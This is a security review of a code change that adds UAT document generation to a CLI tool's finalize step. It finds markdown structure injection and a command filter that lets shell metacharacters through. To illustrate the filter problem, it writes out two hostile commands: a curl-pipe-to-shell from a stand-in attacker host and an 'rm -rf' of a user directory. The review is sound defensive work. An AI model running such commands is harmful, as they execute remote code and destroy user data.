# Security Review: uat-document-generation-at-finalize-every-finalized-change

VERDICT: PASS_WITH_WARNINGS

Scope: `git diff 2fc869140..HEAD -- src tests`. Files reviewed in full:
`src/finalize/uat-generator.ts`, `src/finalize/finalizer.ts`, `src/cli/commands/finalize.ts`,
`src/schemas/project-config.ts`, `src/templates/artifacts/uat.md`, `src/index.ts`, plus the
supporting code they call (`src/templates/template-engine.ts`, `src/artifacts/artifact-store.ts`,
`src/specs/stories-parser.ts`, `src/specs/spec-parser.ts`, `src/config/config-loader.ts`,
`src/util/errors.ts`, `src/schemas/story.ts`, `src/state/state-store.ts`).

Threat model: local CLI; artifacts (`stories.md`, `spec.md`, `intent.md`, `summary.md`) are the
primary untrusted-ish input (same trust domain as the change author, but the generated UAT.md is
presented as a machine-produced trust artifact that humans are told not to edit).

## Findings

### Warnings (should fix)

**W1 — Markdown structure injection: artifact text with embedded newlines can forge UAT
document structure, including fake "Machine-verified" evidence lines.**
- Where: `src/finalize/uat-generator.ts:417-424` (`renderGroups` emits step fields on single
  `- **Do**:` / `- **Observe**:` lines), fed by text that can contain newlines:
  `src/specs/spec-parser.ts:146` / `:255` (scenario step `extractText` preserves soft-break
  `\n` inside paragraph text nodes), `src/specs/stories-parser.ts:68-70` (AC given/when/then),
  and `src/finalize/uat-generator.ts:169-183` (`mdText`/`listItemText` for intent/summary).
- Impact: a crafted multi-line acceptance criterion or scenario step (e.g. a soft-wrapped list
  item whose continuation line starts with `#### Step 9.9`, `- **Machine-verified** — ...`,
  `- [ ] Pass`, or `### Generation notes`) is rendered verbatim, letting artifact content
  fabricate steps, forge machine-verified annotations (which are supposed to be evidence-gated
  by `annotateScenarioStep`/`annotateAcStep`), or inject a fake generation-notes section. The
  template-placeholder route is closed (see I2), but the line-oriented markdown structure is not.
- Severity: Low-Medium. Exploitation requires authoring artifacts in the repo, i.e. the same
  trust domain that could edit most other files — but UAT.md is explicitly a "do not edit"
  trust artifact, so forged machine-verified lines have integrity value beyond ordinary edits.
- Suggested fix: collapse newlines in all step-level strings before rendering, e.g.
  `text.replace(/\s*\r?\n\s*/g, ' ')` applied in `renderGroups` (single choke point) to
  `title`, `setup`, `doText`, `observe`, `preamble`, `trace`, and heading-interpolated names
  (`story.title`, `requirement.name`, `scenario.name`).

**W2 — `Run:` hints re-present verbatim artifact commands as generator-suggested; filter
permits shell metacharacters.**
- Where: `src/finalize/uat-generator.ts:68-84`. `COMMAND_FILTER_RE`
  (`/^[A-Za-z][\w./-]*(?:\s+\S+)+$/`) constrains only the first token; subsequent `\S+` tokens
  admit `|`, `;`, `$()`, URLs, etc. — `curl evil.example/x | sh` and `rm -rf ~/code` both pass
  and get emitted as `(Run: \`...\`)`.
- What is done right: the backtick fencing itself is sound — `COMMAND_SPAN_RE` (`[^`\n]+`)
  guarantees the captured span contains no backticks or newlines, so re-wrapping in single
  backticks at `uat-generator.ts:83` cannot be broken out of, and the span cannot smash the
  surrounding line (modulo W1, which is about other fields too).
- Impact: a malicious artifact can smuggle a destructive command that reads as
  machine-endorsed guidance to the human/agent executing UAT. Same trust domain caveat as W1.
- Severity: Low.
- Suggested fix (any of): label hints as verbatim quotes from the source artifact (e.g.
  `(Run, quoted from artifact: ...)`); tighten the filter to reject tokens containing
  `|`, `;`, `&`, `$`, `>`, `<`; or add a standing caution line to
  `src/templates/artifacts/uat.md` telling reviewers to read commands before running them.

### Informational (no action required for this change)

**I1 — Path handling: no new traversal surface introduced.**
All new filesystem paths use constant segments around `changeName`:
`join(this.specDir, 'changes', changeName)` at `src/finalize/finalizer.ts:170`, the cleanup
`rm(join(..., changeName, 'UAT.md'), { force: true })` at `finalizer.ts:186`, and
`writeArtifact(changeName, 'UAT.md', ...)` at `finalizer.ts:178` (fileName is a literal;
`artifact-store.ts:135-137` joins under the state store base). `changeName` itself is not
segment-validated anywhere in the codebase (pre-existing pattern in `artifact-store.ts` and
`state-store.ts:76-78`); a user passing `../..` to a local CLI attacks only themselves. The
generator reads only fixed filenames (`summary.md`, `spec.md`, `stories.md`, `intent.md`)
under `changeDir` (`uat-generator.ts:453,465,479,504`). If hardening is ever wanted, add a
shared changeName segment validator — out of scope here.

**I2 — Template placeholder injection: verified closed.**
`TemplateEngine.substitute` (`src/templates/template-engine.ts:39-43`) uses
`String.prototype.replace` with a function callback: only the original template is scanned,
and replacement values (including artifact-derived `uat_steps` containing literal
`{change_name}` / `{generated_date}` / `{uat_steps}`) are inserted verbatim, never re-scanned
and never subject to `$&`-style expansion. No recursive substitution is possible. Minor
pre-existing nit: `context[key] ?? match` resolves inherited `Object.prototype` members for
placeholders like `{constructor}`, but templates are trusted build artifacts, so this is not
reachable by untrusted input.

**I3 — ReDoS: all regexes linear; dynamic RegExp input is schema-constrained.**
`COMMAND_SPAN_RE` excludes backticks/newlines from the repeated class; `COMMAND_FILTER_RE`'s
`(?:\s+\S+)+` alternates disjoint classes (no ambiguous backtracking); `norm`, `ROLE_RE`,
`VERIFY_CONTEXT_RE`, `HIGHLIGHT_H2_RE` are linear. The dynamically built
`new RegExp(\`\\b${storyId}\\b\`)` at `uat-generator.ts:156` is safe from regex injection:
story IDs are Zod-validated `^US-\d+$` (`src/schemas/story.ts:14`) via
`StoriesDocumentSchema.parse` before any story reaches the generator
(`src/specs/stories-parser.ts:282`). `storyNumber`'s `id.slice(3)` is likewise safe under
that schema.

**I4 — Degradation error message: no meaningful leak.**
`uatError = getErrorMessage(err)` (`finalizer.ts:184`, surfaced at
`src/cli/commands/finalize.ts:147` in JSON and `:173` on stderr) can contain local absolute
paths from fs errors. Output is consumed by the local operator; the same JSON already exposes
archive paths. No secrets, tokens, or cross-trust-boundary data. The partial-write cleanup
(`rm` with `force: true` + swallowed rejection, `finalizer.ts:185-187`) is correctly scoped
to the single `UAT.md` filename.

**I5 — Config: strict Zod, no new pollution vector.**
`UatConfigSchema` is `.strict()` with a defaulted boolean (`src/schemas/project-config.ts:41-43`),
nested in the top-level `.strict()` `ProjectConfigSchema` (`project-config.ts:104,113`).
Unknown keys under `uat:` are rejected. YAML parsing uses the `eemeli/yaml` package via the
pre-existing `ConfigLoader`; this change adds no new parsing path.

### Suggestions (nice to have)

**S1 — `new URL('../templates/artifacts', import.meta.url).pathname`**
(`src/finalize/uat-generator.ts:532`) percent-encodes spaces/non-ASCII in install paths,
which would make template load fail (triggering the degradation path, so fail-safe). This is
a robustness issue, not security, and matches the existing codebase pattern
(`src/cli/commands/gate.ts:17` etc.). Prefer `fileURLToPath` when the pattern is next touched
codebase-wide.

## Verdict

PASS_WITH_WARNINGS — no critical or exploitable-across-a-trust-boundary issues. W1 (newline
structure injection enabling forged Machine-verified lines) is the one finding worth fixing
before this generator's output is treated as a tamper-evident trust artifact; W2 is a cheap
labeling/filter hardening on top of already-sound backtick fencing.
